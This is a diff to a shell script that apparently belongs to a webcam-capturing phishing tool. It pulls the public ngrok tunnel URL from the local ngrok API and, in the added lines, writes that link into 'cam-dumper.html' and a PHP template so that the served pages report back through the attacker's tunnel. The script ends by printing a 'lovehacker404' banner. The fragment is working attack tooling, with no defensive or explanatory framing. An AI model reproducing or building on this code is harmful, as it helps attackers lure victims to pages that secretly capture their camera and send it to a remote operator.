@@ -58,6 +58,8 @@ echo ""
                            clear
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                           sed 's+forwarding_link+'$link'+g' cam-dumper.html > index2.html
+                           sed 's+forwarding_link+'$link'+g' template.php > index.php
                            echo ""
                            echo ""
                            cat lovehacker404
